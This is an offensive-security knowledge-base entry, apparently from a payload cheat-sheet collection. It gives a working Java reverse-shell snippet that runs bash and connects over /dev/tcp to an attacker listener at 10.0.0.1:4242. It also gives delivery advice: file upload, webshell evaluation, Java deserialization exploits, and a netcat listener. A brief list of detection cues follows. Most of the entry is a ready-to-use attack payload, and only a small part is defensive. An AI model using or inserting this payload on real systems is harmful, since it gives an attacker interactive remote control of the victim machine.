---
id: ae2e332e-6ffa-4143-ac66-d423ea8bd772
type: code
language: Java
verified: true
created_at: '2023-04-06T03:56:24.528775+00:00'
updated_at: '2023-04-10T20:25:28.815655+00:00'
tags:
  - '[[tags/Java]]'
  - '[[tags/Reverse Shell]]'
  - '[[tags/Payload]]'
platforms:
  - Linux
validated: true
---

# Java-Execute-Bash-Reverse-Shell

## Code

```java
Runtime r = Runtime.getRuntime();
Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/10.0.0.1/4242;cat <&5 | while read line; do $line 2>&5 >&5; done'");
p.waitFor();
```

## Description

This Java code snippet executes a bash command to establish a TCP reverse shell from the target back to the attacker. It uses Java's Runtime class to spawn a bash process that opens a socket connection, pipes input/output for command execution, and maintains an interactive session. Ideal for targets with Java available but limited to scripting without additional binaries.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $ATTACKER_IP | IP address of the attacker's listener | 10.0.0.1 |
| $ATTACKER_PORT | Port on which the attacker is listening | 4242 |

## Usage

Embed this code in a Java application, applet, or execute it via an existing shell on the target (e.g., 'java -cp . ReverseShell'). Ensure a listener like netcat ('nc -lvnp 4242') is running on the attacker side. Substitute the IP and port placeholders before execution. This can be delivered via file upload, webshell evaluation, or exploitation of a Java deserialization vulnerability.

## Detection

- Monitor Java processes for exec() calls spawning bash or /bin/sh
- Endpoint logs showing outbound TCP connections from Java to unusual IPs/ports
- Network traffic analysis for bidirectional flows on non-standard ports with shell-like patterns (e.g., command strings in payloads)
- Behavioral detection of Java Runtime invoking system shells in unexpected contexts

## Related

- [[procedures/Establish-Java-Reverse-Shell]]
